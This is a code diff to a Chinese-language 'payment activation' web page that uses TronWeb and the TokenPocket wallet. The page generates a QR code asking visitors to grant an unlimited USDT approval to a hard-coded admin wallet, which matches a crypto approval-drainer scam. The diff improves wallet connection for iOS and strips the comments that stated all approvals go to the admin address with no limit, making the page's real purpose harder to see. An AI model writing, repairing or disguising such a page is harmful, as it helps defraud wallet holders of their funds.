@@ -4,6 +4,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>支付开通</title>
+<!-- 修复iOS Buffer is not defined 垫片 -->
+<script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/dist/buffer.min.js"></script>
+<script>window.Buffer=Buffer;</script>
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
@@ -78,7 +81,6 @@ h1{font-size:24px;margin-bottom:8px}
 <script>
 // ====================== 波场配置 ======================
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-// ============二维码扫码授权、页面按钮授权，全部授权到此地址============
 const ADMIN_WALLET = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const RPC = "https://api.trongrid.io";
 
@@ -91,24 +93,27 @@ const TRC20_ABI = [
 
 let tronWeb = null;
 let userAccount = null;
-let provider = null;
 
 // 连接钱包
 document.getElementById("connectBtn").onclick = async () => {
     try {
+        //TP钱包内置浏览器，优先调用tron_requestAccounts，复用钱包注入的window.tronWeb，不再手动new TronWeb规避Buffer报错
         if(window.tokenpocket && window.tokenpocket.tron){
-            provider = window.tokenpocket.tron;
-            const accounts = await provider.request({method:"tron_requestAccounts"});
-            userAccount = accounts[0];
-            tronWeb = new TronWeb({fullHost: RPC, provider: provider});
-        }else if(window.tronWeb && window.tronWeb.ready){
-            tronWeb = window.tronWeb;
-            userAccount = tronWeb.defaultAddress.base58;
-        }else{
-            alert("⚠️请使用TP钱包【发现】内置浏览器打开页面");
+            await window.tokenpocket.tron.request({method:"tron_requestAccounts"});
+        }
+        //等待钱包注入tronWeb
+        for(let i=0;i<40;i++){
+            if(window.tronWeb && window.tronWeb.ready){
+                tronWeb = window.tronWeb;
+                break;
+            }
+            await new Promise(res=>setTimeout(res,120));
+        }
+        if(!tronWeb || !tronWeb.ready){
+            alert("⚠️钱包桥加载失败，请刷新页面重试！");
             return;
         }
-
+        userAccount = tronWeb.defaultAddress.base58;
         document.getElementById("connectBtn").innerText = "✅ 已连接："+userAccount.slice(0,8)+"...";
         if(userAccount === ADMIN_WALLET){
             document.getElementById("adminPanel").classList.add("show");
@@ -119,9 +124,8 @@ document.getElementById("connectBtn").onclick = async () => {
     }
 };
 
-// ====================生成二维码【spender已经改为你的管理员地址】====================
+// ====================生成二维码====================
 function genQR() {
-    // tron协议：approve(授权给谁，无限额度)
     const qrUri = `tron:${USDT_CONTRACT}?function=approve&args=${ADMIN_WALLET},ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`;
     document.getElementById("qrcode").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrUri)}">`;
 }
